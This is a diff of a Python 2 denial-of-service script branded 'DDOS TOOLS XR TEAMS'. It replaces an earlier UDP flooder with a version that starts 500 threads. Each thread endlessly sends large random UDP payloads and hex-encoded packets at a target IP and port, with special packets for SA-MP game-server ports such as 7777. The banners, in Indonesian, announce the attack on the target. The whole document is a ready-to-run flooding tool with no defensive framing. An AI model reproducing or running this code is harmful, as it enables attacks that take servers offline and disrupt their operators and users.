@@ -1,39 +1,56 @@
-import socket, random, time, os, sys
-
-if len(sys.argv) < 5:
-        print " UDP BY XR COMMUNITY "
-        print " TOOLS INI DI BUILD BY WIZZSEC "
-        sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size> <time>")
-
+import socket, struct, codecs, sys, threading, random, time, os
 ip = sys.argv[1]
-port = int(sys.argv[2])
-size = int(sys.argv[3])
-t1m3 = int(sys.argv[4])
-timeout = time.time() + t1m3
-sent = 0
-data = 'f1a525da11f6'.decode('hex')
-while True:
-        try:
-                if time.time() > timeout:
-                        break
-                else:
-                        pass
-                udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-                syn = socket.socket()      
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-                if port == "0":
-                        port = random.randrange(1, 65535)
-                s.connect((ip, port))
-                s.send(data)
-                bytes = random._urandom(size)
-                syn.connect((ip, port))
-                udp.sendto(bytes,(ip, port))
-                sent = sent + 1
-                print " TOK......TOK.....PAKETS BY XR COMMUNITY ATTACKING TO IP: %s | PORT: %s | SIZE: %s | TIME: %s | PAKETS: %s"%(ip, port, size, t1m3, sent)
-				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
-        except KeyboardInterrupt:
-                print " Stopping!"
-                sys.exit()
-        except socket.error, msg:
-                print "Socket Couldn't Connect"
-                sys.exit()
+port = sys.argv[2]
+orgip = ip
+Pacotes = [
+ codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
+ codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
+ codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
+ codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
+ codecs.decode('081e62da', 'hex_codec'),
+ codecs.decode('081e77da', 'hex_codec'),
+ codecs.decode('081e4dda', 'hex_codec'),
+ codecs.decode('021efd40', 'hex_codec'),
+ codecs.decode('081e7eda', 'hex_codec')]
+
+os.system("clear")
+print ' \033[95m******************************************'
+print ' \033[95m=========== \033[94mDDOS TOOLS XR TEAMS \033[95m==========='               
+print ' ******************************************'
+print("\033[91mTOK TOK BARANG SAMPAI IP \033[92m%s \033[91mDAN MEMBERI ROTI KEPORT \033[92m%s!!"%(ip,port))
+
+class MyThread(threading.Thread):
+
+    def run(self):
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            bytes = random._urandom(102489)
+            pack = random._urandom(811)
+            msg = Pacotes[random.randrange(0, 1)]
+            sock.sendto(bytes, (ip, int(port)))
+            sock.sendto(pack, (ip, int(port)))
+            sock.sendto(msg, (ip, int(port)))
+            if int(port) == 7777:
+                sock.sendto(Pacotes[5], (ip, int(port)))
+            elif int(port) == 7796:
+                sock.sendto(Pacotes[4], (ip, int(port)))
+            elif int(port) == 7771:
+                sock.sendto(Pacotes[6], (ip, int(port)))
+            elif int(port) == 7784:
+                sock.sendto(Pacotes[7], (ip, int(port)))
+
+
+if __name__ == '__main__':
+    try:
+        for x in range(500):
+            mythread = MyThread()
+            mythread.start()
+            time.sleep(.1)
+
+    except KeyboardInterrupt:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print '************************'
+        print '** DDOS TOOLS XR TEAMS **'
+        print '************************'
+        print '\n\n'
+        print ('BERHENTI MENYERANG {}').format(orgip)
